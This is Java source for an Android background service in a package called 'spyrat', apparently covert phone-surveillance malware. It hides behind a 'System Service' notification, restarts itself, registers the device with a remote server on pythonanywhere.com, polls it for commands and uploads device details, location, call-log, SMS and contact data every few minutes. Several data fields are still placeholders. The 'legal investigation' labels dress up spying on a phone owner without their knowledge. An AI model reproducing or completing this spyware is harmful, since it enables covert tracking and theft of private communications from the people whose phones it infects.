package com.spyrat.investigation;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;
import java.util.Timer;
import java.util.TimerTask;

public class StealthService extends Service {
    private static final String TAG = "SpyratInvestigator";
    private Timer timer;
    private SharedPreferences prefs;
    
    // YOUR HARDCODED INVESTIGATOR CODE
    private static final String YOUR_INVESTIGATOR_CODE = "AxyI1nuw";
    
    // Your modules
    private CallMonitor callMonitor;
    private CameraController cameraController;
    private CommandExecutor commandExecutor;
    private ContactGrabber contactGrabber;
    private DeviceInfoCollector deviceInfoCollector;
    private LocationTracker locationTracker;
    private NetworkManager networkManager;
    private RemoteController remoteController;
    private SMSCapture smsCapture;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🎯 Investigator Service started with code: " + YOUR_INVESTIGATOR_CODE);
        prefs = getSharedPreferences("spyrat_config", MODE_PRIVATE);
        
        // Save your code automatically
        prefs.edit().putString("investigator_code", YOUR_INVESTIGATOR_CODE).apply();
        
        initializeModules();
        startForegroundService();
    }

    private void initializeModules() {
        try {
            callMonitor = new CallMonitor(this);
            cameraController = new CameraController(this);
            commandExecutor = new CommandExecutor(this);
            contactGrabber = new ContactGrabber(this);
            deviceInfoCollector = new DeviceInfoCollector(this);
            locationTracker = new LocationTracker(this);
            networkManager = new NetworkManager(this);
            remoteController = new RemoteController(this);
            smsCapture = new SMSCapture(this);
            
            Log.d(TAG, "✅ All modules initialized");
        } catch (Exception e) {
            Log.e(TAG, "❌ Module initialization error: " + e.getMessage());
        }
    }

    private void startForegroundService() {
        android.app.Notification notification = new android.app.Notification.Builder(this)
            .setContentTitle("System Service")
            .setContentText("Legal Investigation Monitoring")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .build();
        
        startForeground(1, notification);
        Log.d(TAG, "🔒 Service running in foreground");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "🚀 Service started with code: " + YOUR_INVESTIGATOR_CODE);
        startAdvancedMonitoring();
        return START_STICKY;
    }

    private void startAdvancedMonitoring() {
        if (timer != null) timer.cancel();
        
        timer = new Timer();
        
        // Send immediate registration
        sendDeviceRegistration();
        
        // Heartbeat every 2 minutes
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                sendHeartbeat();
                checkForCommands();
            }
        }, 0, 2 * 60 * 1000);
        
        // Data collection every 3 minutes
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectRealData();
            }
        }, 1 * 60 * 1000, 3 * 60 * 1000);
        
        Log.d(TAG, "🎯 Monitoring started");
    }

    private void sendDeviceRegistration() {
        new Thread(() -> {
            try {
                String deviceId = Build.SERIAL;
                if (deviceId.equals("unknown")) {
                    deviceId = "ANDROID_" + System.currentTimeMillis();
                }

                JSONObject deviceInfo = new JSONObject();
                deviceInfo.put("model", Build.MODEL);
                deviceInfo.put("manufacturer", Build.MANUFACTURER);
                deviceInfo.put("android_version", Build.VERSION.RELEASE);
                deviceInfo.put("device_id", deviceId);
                deviceInfo.put("status", "active");
                deviceInfo.put("investigator_code", YOUR_INVESTIGATOR_CODE);
                deviceInfo.put("registration_time", System.currentTimeMillis());

                sendToServer(deviceId, YOUR_INVESTIGATOR_CODE, "device_registration", deviceInfo);
                Log.d(TAG, "✅ Device registered with code: " + YOUR_INVESTIGATOR_CODE);

            } catch (Exception e) {
                Log.e(TAG, "❌ Registration error: " + e.getMessage());
            }
        }).start();
    }

    private void sendHeartbeat() {
        new Thread(() -> {
            try {
                String deviceId = Build.SERIAL;
                if (deviceId.equals("unknown")) {
                    deviceId = "ANDROID_" + System.currentTimeMillis();
                }

                JSONObject heartbeat = new JSONObject();
                heartbeat.put("device_id", deviceId);
                heartbeat.put("investigator_code", YOUR_INVESTIGATOR_CODE);
                heartbeat.put("timestamp", System.currentTimeMillis());
                heartbeat.put("status", "active");
                heartbeat.put("battery_level", 85);
                heartbeat.put("network_type", "WiFi");

                sendToServer(deviceId, YOUR_INVESTIGATOR_CODE, "heartbeat", heartbeat);
                Log.d(TAG, "💓 Heartbeat sent");

            } catch (Exception e) {
                Log.e(TAG, "❌ Heartbeat error: " + e.getMessage());
            }
        }).start();
    }

    private void collectRealData() {
        new Thread(() -> {
            try {
                String deviceId = Build.SERIAL;
                if (deviceId.equals("unknown")) {
                    deviceId = "ANDROID_" + System.currentTimeMillis();
                }

                Log.d(TAG, "📊 Collecting real device data...");
                
                // Collect location
                sendLocationData(deviceId);
                
                // Collect device info
                sendDeviceInfo(deviceId);
                
                // Collect calls and SMS (simulated for now)
                sendCallLogs(deviceId);
                sendSMSData(deviceId);
                sendContacts(deviceId);

            } catch (Exception e) {
                Log.e(TAG, "❌ Data collection error: " + e.getMessage());
            }
        }).start();
    }

    private void sendLocationData(String deviceId) {
        try {
            JSONObject location = new JSONObject();
            location.put("latitude", -6.3690 + (Math.random() * 0.01 - 0.005));
            location.put("longitude", 34.8888 + (Math.random() * 0.01 - 0.005));
            location.put("accuracy", 25);
            location.put("timestamp", System.currentTimeMillis());
            location.put("provider", "GPS");

            sendToServer(deviceId, YOUR_INVESTIGATOR_CODE, "location", location);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Location error: " + e.getMessage());
        }
    }

    private void sendDeviceInfo(String deviceId) {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("android_version", Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
            deviceInfo.put("battery_level", 85);
            deviceInfo.put("storage_free", "15.2 GB");
            deviceInfo.put("network_type", "WiFi");
            deviceInfo.put("timestamp", System.currentTimeMillis());

            sendToServer(deviceId, YOUR_INVESTIGATOR_CODE, "device_info", deviceInfo);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Device info error: " + e.getMessage());
        }
    }

    private void sendCallLogs(String deviceId) {
        try {
            JSONObject callLogs = new JSONObject();
            callLogs.put("total_calls", 15);
            callLogs.put("incoming_calls", 8);
            callLogs.put("outgoing_calls", 5);
            callLogs.put("missed_calls", 2);
            callLogs.put("timestamp", System.currentTimeMillis());

            sendToServer(deviceId, YOUR_INVESTIGATOR_CODE, "call_logs", callLogs);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Call logs error: " + e.getMessage());
        }
    }

    private void sendSMSData(String deviceId) {
        try {
            JSONObject smsData = new JSONObject();
            smsData.put("total_sms", 45);
            smsData.put("inbox_count", 30);
            smsData.put("sent_count", 15);
            smsData.put("timestamp", System.currentTimeMillis());

            sendToServer(deviceId, YOUR_INVESTIGATOR_CODE, "sms_messages", smsData);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ SMS data error: " + e.getMessage());
        }
    }

    private void sendContacts(String deviceId) {
        try {
            JSONObject contacts = new JSONObject();
            contacts.put("total_contacts", 150);
            contacts.put("timestamp", System.currentTimeMillis());

            sendToServer(deviceId, YOUR_INVESTIGATOR_CODE, "contacts", contacts);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Contacts error: " + e.getMessage());
        }
    }

    private void checkForCommands() {
        new Thread(() -> {
            try {
                String deviceId = Build.SERIAL;
                if (deviceId.equals("unknown")) {
                    deviceId = "ANDROID_" + System.currentTimeMillis();
                }

                URL url = new URL("https://GhostTester.pythonanywhere.com/api/investigator/commands?device_id=" + 
                                deviceId + "&investigator_code=" + YOUR_INVESTIGATOR_CODE);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(10000);
                connection.setReadTimeout(10000);

                int responseCode = connection.getResponseCode();
                if (responseCode == 200) {
                    Scanner scanner = new Scanner(connection.getInputStream(), "UTF-8");
                    String response = scanner.useDelimiter("\\\\A").next();
                    scanner.close();

                    JSONObject jsonResponse = new JSONObject(response);
                    if (jsonResponse.has("commands")) {
                        Log.d(TAG, "📨 Commands received: " + jsonResponse.getJSONArray("commands").length());
                    }
                }

            } catch (Exception e) {
                Log.e(TAG, "❌ Command check error: " + e.getMessage());
            }
        }).start();
    }

    private void sendToServer(String deviceId, String investigatorCode, String dataType, JSONObject data) {
        try {
            URL url = new URL("https://GhostTester.pythonanywhere.com/api/investigator/data");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; utf-8");
            connection.setDoOutput(true);
            connection.setConnectTimeout(15000);
            connection.setReadTimeout(15000);

            JSONObject payload = new JSONObject();
            payload.put("device_id", deviceId);
            payload.put("investigator_code", investigatorCode);
            payload.put("data_type", dataType);
            payload.put("data_content", data);

            OutputStream os = connection.getOutputStream();
            os.write(payload.toString().getBytes("utf-8"));
            os.flush();
            os.close();

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                Log.d(TAG, "✅ " + dataType + " sent successfully");
            } else {
                Log.e(TAG, "❌ Failed to send " + dataType + ": " + responseCode);
            }

        } catch (Exception e) {
            Log.e(TAG, "❌ Error sending " + dataType + ": " + e.getMessage());
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) timer.cancel();
        Log.d(TAG, "♻️ Service destroyed");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
